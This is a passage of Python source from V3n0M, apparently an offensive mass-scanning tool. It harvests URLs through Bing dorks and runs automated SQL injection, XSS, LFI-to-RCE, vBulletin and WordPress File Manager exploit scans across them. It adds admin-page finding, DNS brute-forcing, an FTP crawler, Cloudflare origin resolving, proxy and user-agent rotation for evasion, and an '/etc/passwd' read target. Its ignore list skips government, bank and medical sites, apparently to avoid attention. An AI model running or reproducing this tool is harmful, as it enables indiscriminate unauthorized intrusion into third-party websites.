        list_name = open(listname, "w", encoding='utf-8')
        finallist.sort()
        for t in finallist:
            list_name.write(t + "\n")
        list_name.close()
        print("Urls saved, please check", listname)
        vulnscan()
    elif chce == '6':
        print(W + "\nPrinting Unsorted urls:\n")
        unsorted.sort()
        for t in unsorted:
            print(B + t)
        endsub = 0
    elif chce == '7':
        print(B + "\nVuln found ", len(vuln))
        print(vuln)
    elif chce == '8':
        print(W + "\nPrinting Sorted urls:\n")
        finallist.sort()
        for t in finallist:
            print(B + t)
    elif chce == '9':
        current = os.getcwd()
        os.chdir(current + '/modules/xss-strike')
        for url in finallist:
            print("Testing:" + url)
            xss = subprocess.Popen("python xsstrike.py -u " + url, shell=True)
            xss.communicate()
    elif chce == '10':
        vuln = []
        print("\n[+] Preparing for SQLI scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            classicinj(url)
        print("\n[+] Preparing for Vbulletin 5.6.x scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            classicvb56(url)
        print("\n[+] Preparing for WordPress File Manager scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            classicwpfm(url)
        print("\n[+] Preparing for Vbulletin 5.x scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            vb5classic(url)
        print("\n[+] Preparing for LFI > RCE  scanning...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            classiclfi(url)
        print("\n[+] Preparing for XSS scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        for url in finallist:
            classicxss(url)

        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
    elif chce == '11':
        endsub = 1
        fmenu()
    elif chce == '12':
        print("[1] Vbulletin 5.6.x > 5.6.2")
        print("[2] WordPress File-Manager")
        print("[3] Vbulletin 5.x > 5.5.x")
        vulnchoice = input("Enter Choice")
        if vulnchoice == '1':
            vuln = []
            vb56test()
            print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        if vulnchoice == '2':
            vuln = []
            wpfmtest()
            print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        if vulnchoice == '3':
            vuln = []
            vb5test()

    else:
        fmenu()


# noinspection PyBroadException
def ignoringGet(url):
    header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
    ua = random.choice(header)
    headers = {
    "user-agent": ua,
}
    try:
        try:
            responce = requests.get(url,headers=headers)
            responce.raise_for_status()
        except Exception:
            return ''
        return responce.text
    except Exception as verb:
        print(str(verb))


def CreateTempFolder(self):
    from tempfile import mkdtemp
    self.temp = mkdtemp(prefix='v3n0m')
    if not self.temp.endswith(os.sep):
        self.temp += os.sep


def progressBar(blocknum, blocksize, totalsize):
    readsofar = blocknum * blocksize
    if totalsize > 0:
        percent = readsofar * 1e2 / totalsize
        s = "\r%5.1f%% %*d / %d" % (
            percent, len(str(totalsize)), readsofar, totalsize)
        sys.stderr.write(s)
    if readsofar >= totalsize:  # near the end
        sys.stderr.write("\n")


def download(url, file, progressBar=None):
    print('Downloading %s' % url)
    urllib.request.urlretrieve(url, file, progressBar)


def unzip(file):
    with zipfile.ZipFile(file + '', 'w') as myzip:
        myzip.write(file)
    os.remove(file + '')


downloads = [
    ['https://www.cloudflare.com/ips-v4', 'ips-v4', progressBar],
    ['https://www.cloudflare.com/ips-v6', 'ips-v6', progressBar],
    ['http://crimeflare.net:82/domains/ipout.zip', 'ipout.zip',
     progressBar]
]


# noinspection PyBroadException
async def search(pages_pulled_as_one):
    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        progress = 0
        for dork in loaded_Dorks:
            progress += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + " site:" + site
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(25):
                    results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                        (page + i) * 50 + 1) + "&count=50"
                    futures.append(loop.run_in_executor(None, ignoringGet, results_web))
                page += 25
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
                    if basename is None:
                        basename = re.search(r"(?<=://).*", name)
                    if basename is not None:
                        basename = basename.group(0)
                    if basename not in domains and basename is not None:
                        domains.add(basename)
                        urls.append(name)
                totalprogress = len(loaded_Dorks)
                percent = int((1.0 * progress / int(totalprogress)) * 100)
                urls_len = len(urls)
                os.system('clear')
                start_time = datetime.now()
                timeduration = start_time - timestart
                ticktock = timeduration.seconds
                hours, remainder = divmod(ticktock, 3600)
                minutes, seconds = divmod(remainder, 60)
                sys.stdout.flush()
                logo()
                sys.stdout.write(W +
                                 "\r\x1b[K " + R + "| Domain: <%s> Has been targeted \n "
                                                   "| Collected urls: %s Since start of scan \n"
                                                   " | D0rks: %s/%s Progressed so far \n"
                                                   " | Percent Done: %s \n"
                                                   " | Current page no.: <%s> in Cycles of 25 Pages of results pulled in Asyncio\n"
                                                   " | Dork In Progress: %s\n"
                                                   " | Elapsed Time: %s\n" % (R +
                                                                              site, repr(urls_len), progress,
                                                                              totalprogress,
                                                                              repr(percent), repr(page), dork,
                                                                              '%s:%s:%s' % (hours, minutes, seconds)))
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []
    print("\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ", len(urls))
    for url in urls:
        unsorted.append(url)
        try:
            host = url.split("/", 3)
            domain = host[2]
            for site in sitearray:
                if domain not in tmplist and "=" in url and any(x in url for x in
                                                                sitearray):
                    finallist.append(url)
                    tmplist.append(domain)
        except KeyboardInterrupt:
            os.system('clear')
            chce1 = input(':')
            logo()
            print(G + "Program Paused" + R)
            print("[1] Unpause")
            print("[2] Skip rest of scan and Continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                vulnscan()
            if chce1 == "3":
                fmenu()
            else:
                pass
            continue
    print("[+] URLS (sorted)  : Trash, Duplicates, Dead-Links and other rubbish removed ", len(finallist))
    return finallist


# noinspection PyBroadException
def fmenu():
    import time
    global vuln
    global customlist
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and Vuln Scan")
    print("[2] Admin page finder")
    print("[3] Toxin - Mass IP/Port/Services Vuln Scanner *Not Released Yet* ")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[6] Cloudflare Resolving")
    print("[7] E-Z XSSTRIKE")
    print("[8] Misc Options")
    print("[0] Exit\n")
    chce = input(":")

    if chce == '1':
        print(W + "")
        fscan()

    elif chce == '2':
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen(
            'python3 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
            shell=True)
        findadmin.communicate()
        subprocess._cleanup()

    elif chce == '3':
        import time
        print(B)
        toxin.menu()
    elif chce == '4':
        target_site = input("Enter the site eg target.com: ")
        print("[1] Normal Scan suitable for average sites")
        print(
            "[2] Scan All The Things, if its on the internet, we'll find it... Go cook a cake, this will take a LONG time")
        allthethings = input(":")
        att = ""
        if allthethings == '1':
            att = str(" ")
        elif allthethings == '2':
            att = str("att")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(
            'python3 ' + pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + att + " -t 200"
            , shell=True)
        dnsbrute.communicate()
        subprocess._cleanup()

    elif chce == '5':
        print(W + "")
        enable_proxy()

    elif chce == '0':
        print(R + "\n Exiting ...")
        print(W)
        sys.exit(0)

    elif chce == '6':
        cloud()
        fmenu()
    elif chce == '7':
        current = os.getcwd()
        os.chdir(current + '/modules/xss-strike')
        xss = subprocess.Popen("python V3n0mWrapper.py", shell=True)
        xss.communicate()


    elif chce == '8':
        print(W + "")
        os.system('clear')
        logo()
        print("[1] Skip to custom SQLi list checking")
        print("[2] SKip to custom XSS list checking")
        print("[3] Skip to custom LFI list checking")
        print("[4] Skip to custom Vbulletin 5.x list checking ")
        print("[5] Skip to custom Vbulletin < 5.6.2 list checking")
        print("[6] Skip to custom WordPress FileManager list checking")
        print("[7] Launch LFI Suite")
        print("[8] FTP Crawler")
        print("[9] Skip to custom target list")
        print("[10]Print contents of log files")
        print("[11]Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
        print("[12]Perform forced update of ALL installed Python packages and dependancies on system")
        print("[13]Donations information")
        print("[0] Return to main menu")
        chce2 = input(":")
        if chce2 == '1':
            def sqli_url():
                for url in sqllist:
                    if url not in urllist:
                        urllist.append(url)
                        classicinj(url)
                    if url in urllist:
                        pass
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            sqllist = input('Enter list ')
            sqllist = [line.strip() for line in open(sqllist, 'r', encoding='utf-8')]
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(sqli_url)

        elif chce2 == '2':
            def xss_url():
                for url in xsslist:
                    if url not in urllist:
                        urllist.append(url)
                        classicxss(url)
                    if url in urllist:
                        pass
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            xsslist = input('Enter list ')
            xsslist = [line.strip() for line in open(xsslist, 'r', encoding='utf-8')]
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(xss_url)


        elif chce2 == '3':
            def lfi_url():
                try:
                    for url in lfilist:
                        if url not in urllist:
                            urllist.append(url)
                            classiclfi(url)
                        if url in urllist:
                            pass
                except exception as e:
                    print(e)
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            lfilist = input('Enter list ')
            lfilist = [line.strip() for line in open(lfilist, 'r', encoding='utf-8')]
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(lfi_url)
        elif chce2 == '4':
            def vb5_url():
                for url in vb5list:
                    if url not in urllist:
                        urllist.append(url)
                        vb5classic(url)
                    if url in urllist:
                        pass
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            vb5list = input('Enter list ')
            vb5list = [line.strip() for line in open(vb5list, 'r', encoding='utf-8')]
            global sites
            sites = input('Enter site to search for ex .com ')
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(vb5_url)


        elif chce2 == '5':
            def vb56_url():
                for url in vb56list:
                    if url not in urllist:
                        urllist.append(url)
                        classicvb56(url)
                    if url in urllist:
                        pass
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            vb56list = input('Enter list ')
            vb56list = [line.strip() for line in open(vb56list, 'r', encoding='utf-8')]
            sites = input('Enter site to search for ex .com ')
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(vb56_url)



        elif chce2 == '6':
            def wpfm_url():
                for url in wpfmlist:
                    if url not in urllist:
                        urllist.append(url)
                        classicwpfm(url)
                    if url in urllist:
                        pass
            threadcount = input('How many threads ')
            threadcount = int(threadcount)
            wpfmlist = input('Enter list ')
            wpfmlist = [line.strip() for line in open(wpfmlist, 'r', encoding='utf-8')]
            sites = input('Enter site to search for ex .com ')
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(wpfm_url)

        elif chce2 == '7':
            lfisuite = subprocess.Popen('python '  "lfisuite.py ", shell=True)
            lfisuite.communicate()
            subprocess._cleanup()

        elif chce2 == '8':
            randomip = input("How many IP addresses do you want to scan: ")
            current_dir = os.getcwd()
            os.chdir(current_dir + '/modules')
            ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
            ftpcrawl.communicate()

        elif chce2 == '9':
            import target
        elif chce2 == '10':
            for filename in glob("*.txt"):
                print(filename)
            print("Dumping output of Cache complete, Sleeping for 5 seconds")
            time.sleep(5)
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(lfi_url)
        elif chce2 == '11':
            try:
                print("Checking if Cache or Logs even exist!")
                time.sleep(1)
                for filename in glob("*.txt"):
                    os.remove(filename)
                    print("Cache has been cleared, all logs have been deleted")
                    time.sleep(2)
            except Exception:
                print("No Log Files To Flush!")
        elif chce2 == '12':
            import time
            euid = os.geteuid()
            if euid == 0:
                print(
                    "You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
                time.sleep(6)
                killpid()
            import pip
            from subprocess import call
            import time
            print("Updating V3n0M Module Features First: Cloudbuster files. Please wait.")
            time.sleep(3)
            for d in downloads:
                download(d[0], d[1], d[2])
            unzip('ipout.zip')
            os.replace(Path('ips-v4'), Path('./lists/ips-v4'))
            os.replace(Path('ips-v6'), Path('./lists/ips-v6'))
            print('Everything up to date!')
            print("Cloudbuster features updated!, Moving onto Python Modules and Dependencies...")
            time.sleep(4)
            sys.stdout.flush()
            print(
                "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
            print("You will have 10 seconds to cancel this action before the system begins")
            time.sleep(10)
            call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user",
                 shell=True)
            subprocess._cleanup()
            pass
        elif chce2 == '13':
            donations()



d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
xsses = [line.strip() for line in open("lists/xsses", 'r', encoding='utf-8')]
lfis = [line.strip() for line in open("lists/pathtotest.txt", 'r', encoding='utf-8')]
tables = [line.strip() for line in open("lists/tables", 'r', encoding='utf-8')]
columns = [line.strip() for line in open("lists/columns", 'r', encoding='utf-8')]
search_ignore = ['gov', 'fbi', 'javascript', 'stackoverflow',
                 'microsoft', '24img.com', 'v3n0m', 'venom',
                 'evilzone', 'iranhackers', 'pastebin', 'charity',
                 'school', 'learning', 'foundation', 'hostpital',
                 'medical', 'doctors', 'emergency', 'nsa', 'cia',
                 'mossad', 'yahoo', 'dorks', 'd0rks', 'bank', 'school',
                 'hack', 'msdn', 'google', 'youtube', 'phpbuddy', 'iranhack',
                 'phpbuilder', 'codingforums', 'phpfreaks', 'facebook', 'twitter',
                 'hackforums', 'askjeeves', 'wordpress', 'github', 'pentest']

random.shuffle(header)
random.shuffle(lfis)


# noinspection PyBroadException
def enable_proxy():
    import time
    global ProxyEnabled
    try:
        requiresID = bool(
            input("Requires Username/Password? Leave Blank if not required, otherwise type y/yes/true/True  :"))
        print(requiresID)
        print("Please select Proxy Type - Options = socks4, socks5  : ")
        proxytype = input(str())
        print(" Please enter Proxy IP address - ie. 127.0.0.66  :")
        proxyip = input(int)
        print(" Please enter Proxy Port - ie. 1076  :")
        proxyport = input(int)
        if proxytype == str("socks4"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
        elif proxytype == str("socks5"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    print(" Socks 5 Proxy Support Enabled")
                    socks.socket = socks.socksocket
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
    except Exception:
        pass


# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"


def cache_Check():
    global cachestatus
    my_file1 = Path("v3n0m-lfi.txt")
    my_file2 = Path("v3n0m-rce.txt")
    my_file3 = Path("v3n0m-xss.txt")
    my_file5 = Path("v3n0m-sqli.txt")
    my_file4 = Path("IPLogList.txt")
    if my_file1.is_file() or my_file2.is_file() or my_file3.is_file() or my_file4.is_file() or my_file5.is_file():
        cachestatus = "** Cache NOT Empty**"
    else:
        cachestatus = "Logs Cache is Empty "


def sql_list_counter():
    global sql_count
    try:
        f = open("v3n0m-sqli.txt", encoding='utf-8')
        l = [x for x in f.readlines() if x != "\n"]
        sql_count = (len(l))
    except FileNotFoundError:
        sql_count = 0


def lfi_list_counter():
    global lfi_count
    try:
        f = open("v3n0m-lfi.txt", encoding='utf-8')
        l = [x for x in f.readlines() if x != "\n"]
        lfi_count = (len(l))
    except FileNotFoundError:
        lfi_count = 0


def xss_list_counter():
    global xss_count
    try:
        f = open("v3n0m-xss.txt", encoding='utf-8')
        l = [x for x in f.readlines() if x != "\n"]
        xss_count = (len(l))
    except FileNotFoundError:
        xss_count = 0


def misc_list_counter():
    global misc_count
    try:
        f = open("v3n0m-misc.txt", encoding='utf-8')
        l = [x for x in f.readlines() if x != "\n"]
        misc_count = (len(l))
    except FileNotFoundError:
        misc_count = 0


def rce_list_counter():
    global rce_count
    try:
        f = open("v3n0m-rce.txt", encoding='utf-8')
        l = [x for x in f.readlines() if x != "\n"]
        rce_count = (len(l))
    except FileNotFoundError:
        rce_count = 0


list_count = 0
lfi_count = 0
subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60  # Change this at your will
endsub = 1
gets = 0
file = "/etc/passwd"
ProxyEnabled = False
menu = True
current_version = str("431  ")
while True:
    fmenu()




